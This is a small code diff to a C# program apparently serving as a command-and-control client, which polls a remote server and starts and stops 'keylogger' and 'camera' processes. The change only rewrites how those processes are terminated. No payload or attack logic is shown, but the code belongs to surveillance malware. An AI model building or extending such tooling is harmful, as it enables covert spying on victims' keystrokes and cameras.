@@ -26,7 +26,6 @@ namespace C2
         {
             
             server.Timeout = TimeSpan.FromDays(1);
-
             while (true)
             {
                 // each 5 seconds the program will try to connect to the remote server
@@ -325,7 +324,7 @@ namespace C2
                     {
                         if (processName == "keylogger")
                         {
-                            process.Kill();
+                            TerminateProcessAndChildren(process.ProcessName);
                             Console.WriteLine($"[+] Process {process.Id} killed!");
                             processName = string.Empty;
                         }
@@ -335,9 +334,7 @@ namespace C2
                     {
                         if (processName == "camera")
                         {
-                            TerminateProcessAndChildren(process);
-                            
-                            Console.WriteLine($"[+] Process {process.Id} killed!");
+                            TerminateProcessAndChildren(process.ProcessName);
                             processName = string.Empty;
                         }
                     }
@@ -400,20 +397,32 @@ namespace C2
                 return err;
         }
 
-        static void TerminateProcessAndChildren(Process parent)
+        static void TerminateProcessAndChildren(string processName)
         {
-            // Retrieve all child processes of the main process
-            List<Process> children = GetChildProcesses(parent);
-
-            // Terminate all child processes recursively
-            foreach (Process child in children)
+            try
             {
-                TerminateProcessAndChildren(child);
+                Process[] processes = Process.GetProcessesByName(processName);
+                if (processes.Length == 0)
+                {
+                    Console.WriteLine($"No processes with the name {processName} found.");
+                }
+                else
+                {
+                    foreach (Process process in processes)
+                    {
+                        Console.WriteLine($"Killing process {process.ProcessName} (ID: {process.Id})");
+                        process.Kill();
+                        process.WaitForExit();
+                        Console.WriteLine($"Process {process.ProcessName} (ID: {process.Id}) killed.");
+                    }
+                }
             }
-
-            // Kill the main process
-            parent.Kill();
+            catch (Exception ex)
+            {
+                Console.WriteLine($"An error occurred: {ex.Message}");
+            }
         }
+
 
         static List<Process> GetChildProcesses(Process parent)
         {
